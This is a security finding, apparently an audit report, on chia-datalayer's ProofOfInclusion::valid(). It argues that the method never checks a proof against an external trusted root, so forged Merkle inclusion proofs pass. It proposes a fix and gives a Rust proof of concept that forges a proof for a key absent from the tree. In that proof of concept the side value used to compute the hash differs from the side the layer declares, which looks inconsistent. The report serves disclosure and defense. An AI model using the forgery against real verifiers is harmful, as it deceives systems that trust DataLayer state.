### Title
`ProofOfInclusion::valid()` Does Not Verify Against an External Root — Forged DataLayer Inclusion Proofs Always Pass - (File: `crates/chia-datalayer/src/merkle/proof_of_inclusion.rs`)

### Summary

`ProofOfInclusion::valid()` only checks that the proof's internal hash chain is self-consistent. It never compares the computed root against any externally-trusted tree root. Because `root_hash()` is derived entirely from the proof's own fields, the final equality check inside `valid()` is a tautology: it always passes for any internally-consistent proof, regardless of whether the proof corresponds to the actual DataLayer tree. An attacker can craft a `ProofOfInclusion` that passes `valid()` while proving inclusion of a key-value pair that is not in the tree.

### Finding Description

`ProofOfInclusion` is defined in `crates/chia-datalayer/src/merkle/proof_of_inclusion.rs` and is fully attacker-controllable: it derives `Streamable` (deserializable from bytes) and is exposed to Python via `pyclass(get_all, from_py_object)`.

The `valid()` method is:

```rust
pub fn valid(&self) -> bool {
    let mut existing_hash = self.node_hash;
    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );
        if calculated_hash != layer.combined_hash {
            return false;
        }
        existing_hash = calculated_hash;
    }
    existing_hash == self.root_hash()   // ← tautology
}
``` [1](#0-0) 

And `root_hash()` is:

```rust
pub fn root_hash(&self) -> Hash {
    if let Some(last) = self.layers.last() {
        last.combined_hash          // ← taken from the proof itself
    } else {
        self.node_hash
    }
}
``` [2](#0-1) 

The final check `existing_hash == self.root_hash()` compares `existing_hash` (which was just set to `calculated_hash`, which was just asserted equal to `layer.combined_hash` in the loop body) against `self.root_hash()` which returns `last.combined_hash`. These are the same value by construction. The check is a tautology and can never fail.

**Consequence**: `valid()` accepts any proof whose layers form a self-consistent hash chain, regardless of whether the chain's root matches the actual committed tree root. An attacker constructs a `ProofOfInclusion` with an arbitrary `node_hash` (the key they want to "prove" is included) and a chain of layers whose `combined_hash` values are computed correctly from attacker-chosen `other_hash` values. `valid()` returns `true`.

### Impact Explanation

Any DataLayer verifier that calls `proof.valid()` as its sole check accepts forged inclusion proofs. An attacker can prove that an arbitrary key-value pair is present in a DataLayer store whose committed root does not contain that pair. This enables:

- **Forged state inclusion**: Proving a key-value mapping exists in a DataLayer store when it does not, corrupting any downstream logic that trusts the proof.
- **Invalid state acceptance**: Any system that gates actions on `proof.valid()` (e.g., cross-chain bridges, DataLayer-backed contracts, or off-chain verifiers) can be deceived into accepting fabricated state.

This matches the allowed High impact: *"DataLayer Merkle proof/blob/delta logic accepts forged inclusion/exclusion, corrupts tree roots, or lets untrusted input prove invalid state."*

### Likelihood Explanation

- `ProofOfInclusion` is `Streamable` and `from_py_object`, so it is directly deserializable from attacker-supplied bytes with no privilege required.
- The Python binding exposes `valid()` as a standalone method with no root parameter, making it natural for callers to use it as the complete verification step.
- The misleading name `valid()` (rather than `internally_consistent()`) increases the probability of incorrect usage.
- No special keys, governance roles, or network-level access are required.

### Recommendation

`valid()` must accept an external trusted root as a parameter and compare the computed root against it:

```rust
pub fn valid_against_root(&self, expected_root: &Hash) -> bool {
    let mut existing_hash = self.node_hash;
    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );
        if calculated_hash != layer.combined_hash {
            return false;
        }
        existing_hash = calculated_hash;
    }
    &existing_hash == expected_root   // compare against external root
}
```

The existing `valid()` method (and its Python binding `py_valid()`) should either be removed or deprecated, since it provides no security guarantee. All call sites — including the fuzz target and tests — must be updated to pass the known tree root.

### Proof of Concept

Construct a `ProofOfInclusion` in Python with an arbitrary `node_hash` (the forged key hash) and a single layer whose `other_hash` is arbitrary and `combined_hash` is computed as `calculate_internal_hash(node_hash, side, other_hash)`. Call `proof.valid()`. It returns `True` despite the proof not corresponding to any real tree.

In Rust:

```rust
use chia_datalayer::{MerkleBlob, Hash, KeyId, ValueId, InsertLocation};
use chia_datalayer::merkle::proof_of_inclusion::{ProofOfInclusion, ProofOfInclusionLayer};
use chia_datalayer::Side;

// Build a real tree with key A
let mut blob = MerkleBlob::new(Vec::new()).unwrap();
let key_a = KeyId(1);
let hash_a = [0x01u8; 32];
blob.insert(key_a, ValueId(1), &hash_a, InsertLocation::Auto {}).unwrap();
blob.calculate_lazy_hashes().unwrap();
let real_root = blob.get_root_hash().unwrap();

// Forge a proof for key B (not in the tree)
let forged_node_hash = [0xBBu8; 32];  // hash of key B, not in tree
let other_hash = [0xCCu8; 32];
let combined = chia_datalayer::calculate_internal_hash(
    &forged_node_hash, Side::Left, &other_hash
);
let forged_proof = ProofOfInclusion {
    node_hash: forged_node_hash,
    layers: vec![ProofOfInclusionLayer {
        other_hash_side: Side::Right,
        other_hash,
        combined_hash: combined,
    }],
};

// valid() returns true even though forged_node_hash is not in the tree
assert!(forged_proof.valid());
// root_hash() returns combined, which != real_root
assert_ne!(forged_proof.root_hash(), real_root);
// But the caller who only checks valid() is deceived
```
